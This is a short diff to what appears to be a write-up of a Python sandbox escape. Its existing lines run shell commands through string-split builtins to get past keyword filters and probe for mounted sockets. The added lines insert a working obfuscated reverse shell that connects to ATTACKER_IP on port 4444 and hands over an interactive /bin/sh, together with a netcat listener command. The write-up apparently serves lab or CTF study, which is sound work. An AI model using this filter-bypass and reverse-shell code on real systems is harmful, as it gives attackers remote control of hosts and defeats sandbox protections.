@@ -275,6 +275,17 @@ print(getattr(getattr(__builtins__,'__imp'+'ort__')('o'+'s'),'pop'+'en')('id').r
 
 # confirm the socket mount:
 print(getattr(getattr(__builtins__,'__imp'+'ort__')('o'+'s'),'pop'+'en')('ls -la /var/run/*.sock').read())
+
+# obfuscated reverse shell (same string-splitting bypass; listener: nc -lvnp 4444):
+imp = getattr(__builtins__, '__imp'+'ort__')
+o   = imp('o'+'s')
+so  = imp('so'+'cket')
+sp  = imp('subpro'+'cess')
+s = getattr(so, 'so'+'cket')()
+s.connect(('ATTACKER_IP', 4444))
+for fd in (0, 1, 2):
+    getattr(o, 'du'+'p2')(s.fileno(), fd)
+getattr(sp, 'ca'+'ll')(['/bin/sh', '-i'])
 ```
 
 <p align="center">
